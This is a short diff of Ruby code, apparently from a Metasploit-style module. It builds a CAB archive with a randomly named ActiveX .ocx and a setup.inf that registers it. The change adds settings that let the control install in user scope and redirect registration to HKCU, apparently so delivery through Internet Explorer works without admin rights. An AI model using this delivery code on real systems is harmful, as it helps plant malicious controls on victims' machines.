@@ -668,18 +668,22 @@ require 'lcabruby'
 		cab_file.strip_path = true
 		ocx_name = Rex::Text.rand_text_alpha(rand(5)+8) << '.ocx'
 
-		setup_inf = %Q|
+		# On older IE InstallScope=user|machine may be required?
+		setup_inf = %Q{
 [version]
 	signature="$CHICAGO$"
 	AdvancedINF=2.0
 [Add.Code]
 	#{ocx_name}=#{ocx_name}
+[Deployment]
+    InstallScope=user
 [#{ocx_name}]
 	file-win32-x86=thiscab
 	clsid={56C04F88-9E36-434B-82A3-D552B81A8CB9}
 	FileVersion=1,0,0,1
 	RegisterServer=yes
-|
+	RedirectToHKCU=yes
+}
 		files = []
 		files << { :filename => ocx_name, :data => ocx }
 		files << { :filename => 'setup.inf', :data => setup_inf }
